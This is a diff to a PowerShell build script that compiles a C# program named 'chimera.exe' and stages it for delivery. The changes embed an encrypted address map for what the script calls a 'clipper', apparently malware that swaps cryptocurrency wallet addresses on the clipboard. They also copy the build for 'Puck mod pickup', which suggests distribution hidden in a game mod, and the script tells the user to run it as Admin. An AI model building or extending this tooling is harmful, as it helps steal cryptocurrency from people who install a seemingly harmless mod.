@@ -67,7 +67,8 @@ Write-Host "======================================="
 
 if (-not (Test-Path $csc)) { Write-Host "ERROR: csc.exe not found at $csc"; exit 1 }
 
-$out = Join-Path $here "chimera_local_test.exe"
+$out    = Join-Path $here "chimera.exe"
+$resMap = Join-Path $agent "crypto_map_enc"
 
 $sourceList = @(
     (Join-Path $here "LocalTest.cs"),
@@ -91,6 +92,7 @@ $sourceList = @(
 )
 
 $cscCmd = "`"$csc`" /target:exe /platform:x86 /out:`"$out`" /r:System.Net.Http.dll /r:System.Drawing.dll /r:System.Management.dll /r:System.ServiceProcess.dll /r:System.Windows.Forms.dll"
+if (Test-Path $resMap) { $cscCmd = $cscCmd + " /res:`"$resMap`",crypto_map_enc" } else { Write-Host "WARNING: crypto_map_enc not found at $resMap — clipper won't load addresses" }
 foreach ($s in $sourceList) { $cscCmd = $cscCmd + " `"$s`"" }
 
 Write-Host "[*] Compiling..."
@@ -101,10 +103,16 @@ if (-not (Test-Path $out)) {
     exit 1
 }
 $sz2 = [int]((Get-Item $out).Length / 1024)
-Write-Host "[+] chimera_local_test.exe built - $sz2 KB"
+Write-Host "[+] chimera.exe built - $sz2 KB"
 
-Copy-Item $out (Join-Path $stage "chimera_local_test.exe") -Force
-Write-Host "[+] Copied to $stage\chimera_local_test.exe"
+Copy-Item $out (Join-Path $stage "chimera.exe") -Force
+Write-Host "[+] Copied to $stage\chimera.exe"
+# Also copy to chimera-local-test for Puck mod pickup
+$localTest = "C:\projects\chimera-local-test"
+if (Test-Path $localTest) {
+    Copy-Item $out (Join-Path $localTest "chimera.exe") -Force
+    Write-Host "[+] Copied to $localTest\chimera.exe"
+}
 
 Write-Host ""
 Write-Host "======================================="
@@ -113,6 +121,6 @@ Write-Host "======================================="
 Write-Host ""
 Write-Host "Run as Admin:"
 Write-Host "  cd C:\Users\Public"
-Write-Host "  .\chimera_local_test.exe"
+Write-Host "  .\chimera.exe"
 Write-Host ""
-Write-Host "Log + loot -> C:\projects\chimera-local-test"
+Write-Host "Puck mod pickup -> C:\projects\chimera-local-test\chimera.exe"
